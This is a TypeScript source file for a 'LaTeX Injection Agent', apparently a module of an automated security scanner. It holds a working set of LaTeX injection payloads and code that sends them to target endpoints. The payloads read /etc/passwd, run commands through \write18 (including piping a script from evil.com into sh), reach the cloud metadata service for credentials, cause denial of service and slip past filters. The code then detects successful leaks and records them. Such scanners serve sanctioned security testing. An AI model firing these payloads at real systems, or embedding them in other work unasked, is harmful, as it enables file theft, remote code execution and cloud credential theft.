/**
 * LaTeX Injection Agent
 * Based on PayloadsAllTheThings/LaTeX Injection
 * 
 * Detects and exploits LaTeX injection vulnerabilities:
 * - File read via \input, \include
 * - Command execution via \write18
 * - SSRF via \url
 * - DoS via infinite loops
 * - Information disclosure
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface LaTeXJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testFileRead?: boolean;
    testRCE?: boolean;
    testSSRF?: boolean;
  };
}

// LaTeX Injection Payloads
const LATEX_PAYLOADS = {
  // File read payloads
  fileRead: [
    '\\input{/etc/passwd}',
    '\\include{/etc/passwd}',
    '\\lstinputlisting{/etc/passwd}',
    '\\usepackage{verbatim}\\verbatiminput{/etc/passwd}',
    '\\read\\file to\\line \\input{/etc/passwd}',
    // Windows
    '\\input{C:/Windows/System32/drivers/etc/hosts}',
    // Relative paths
    '\\input{../../../etc/passwd}',
    '\\input{....//....//....//etc/passwd}',
  ],

  // Command execution (requires --shell-escape)
  rce: [
    '\\immediate\\write18{id}',
    '\\immediate\\write18{whoami}',
    '\\immediate\\write18{cat /etc/passwd}',
    '\\immediate\\write18{curl http://evil.com/shell.sh | sh}',
    // Alternative methods
    '\\input{|id}',
    '\\input{|"id"}',
    '\\catcode`\\@=0 \\@input{|id}',
    // Using different packages
    '\\usepackage{bashful}\\bash{id}',
  ],

  // SSRF payloads
  ssrf: [
    '\\url{http://169.254.169.254/latest/meta-data/}',
    '\\href{http://169.254.169.254/}{click}',
    '\\includegraphics{http://evil.com/image.png}',
    '\\input{http://evil.com/payload.tex}',
  ],

  // Information disclosure
  infoDisclosure: [
    '\\typeout{\\jobname}',
    '\\message{\\the\\inputlineno}',
    '\\show\\jobname',
    '\\meaning\\jobname',
  ],

  // DoS payloads
  dos: [
    '\\def\\x{\\x}\\x',  // Infinite recursion
    '\\loop\\iftrue\\repeat',  // Infinite loop
    '\\newcount\\n \\n=0 \\loop \\advance\\n by 1 \\ifnum\\n<1000000 \\repeat',
  ],

  // Bypass techniques
  bypass: [
    // Unicode bypass
    '\\input{/etc/p\\string asswd}',
    // Catcode manipulation
    '\\catcode`\\%=12 \\input{/etc/passwd}',
    // Newline injection
    '\\input{/etc/\npasswd}',
    // Comment bypass
    '\\input{/etc/passwd}%',
  ],
};

// Common LaTeX endpoints
const LATEX_ENDPOINTS = [
  '/latex',
  '/pdf',
  '/render',
  '/compile',
  '/generate',
  '/api/latex',
  '/api/pdf',
  '/convert',
  '/tex',
];

export class LaTeXInjectionAgent extends BaseAgent<LaTeXJob> {
  constructor() {
    super('latexinjection');
  }

  protected getSteps() {
    return [
      { name: 'Identify LaTeX endpoints', metadata: {} },
      { name: 'Test file read payloads', metadata: {} },
      { name: 'Test RCE payloads', metadata: {} },
      { name: 'Test SSRF payloads', metadata: {} },
      { name: 'Test bypass techniques', metadata: {} },
    ];
  }

  async process(job: Job<LaTeXJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting LaTeX injection testing');

    for (const url of urls) {
      try {
        // Discover LaTeX endpoints
        const latexEndpoints = await this.discoverLatexEndpoints(url);

        for (const endpoint of latexEndpoints) {
          // Test file read
          if (options.testFileRead !== false) {
            const fileFindings = await this.testFileRead(endpoint);
            findings.push(...fileFindings);
          }

          // Test RCE
          if (options.testRCE !== false) {
            const rceFindings = await this.testRCE(endpoint);
            findings.push(...rceFindings);
          }

          // Test SSRF
          if (options.testSSRF !== false) {
            const ssrfFindings = await this.testSSRF(endpoint);
            findings.push(...ssrfFindings);
          }
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing LaTeX injection');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async discoverLatexEndpoints(baseUrl: string): Promise<string[]> {
    const found: string[] = [];
    const urlObj = new URL(baseUrl);
    const base = `${urlObj.protocol}//${urlObj.host}`;

    for (const endpoint of LATEX_ENDPOINTS) {
      try {
        const response = await fetch(`${base}${endpoint}`, { method: 'HEAD' });
        if (response.status !== 404) {
          found.push(`${base}${endpoint}`);
        }
      } catch {
        // Continue
      }
    }

    // Also check if base URL accepts LaTeX
    found.push(baseUrl);

    return [...new Set(found)];
  }

  private async testFileRead(endpoint: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of LATEX_PAYLOADS.fileRead) {
      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latex: payload, content: payload, tex: payload }),
        });

        const body = await response.text();

        // Check for /etc/passwd content
        if (body.includes('root:') || body.includes('/bin/bash') || body.includes('/bin/sh')) {
          findings.push({
            type: 'latex-file-read',
            url: endpoint,
            payload,
            severity: 'critical',
            evidence: 'File content leaked via LaTeX injection',
            impact: 'Arbitrary file read',
          });
          break;
        }

        // Check for Windows hosts file
        if (body.includes('localhost') && body.includes('127.0.0.1')) {
          findings.push({
            type: 'latex-file-read',
            url: endpoint,
            payload,
            severity: 'critical',
            evidence: 'Windows hosts file leaked',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testRCE(endpoint: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of LATEX_PAYLOADS.rce) {
      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latex: payload, content: payload, tex: payload }),
        });

        const body = await response.text();

        // Check for command output
        if (body.includes('uid=') || body.includes('gid=') || 
            body.includes('root') && body.includes(':x:')) {
          findings.push({
            type: 'latex-rce',
            url: endpoint,
            payload,
            severity: 'critical',
            evidence: 'Command execution via \\write18',
            impact: 'Remote Code Execution',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testSSRF(endpoint: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of LATEX_PAYLOADS.ssrf) {
      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latex: payload, content: payload, tex: payload }),
        });

        const body = await response.text();

        // Check for AWS metadata
        if (body.includes('ami-id') || body.includes('instance-id') || 
            body.includes('security-credentials')) {
          findings.push({
            type: 'latex-ssrf',
            url: endpoint,
            payload,
            severity: 'critical',
            evidence: 'AWS metadata accessed via LaTeX SSRF',
            impact: 'Cloud credential theft',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store LaTeX finding');
    }
  }
}

export default new LaTeXInjectionAgent();
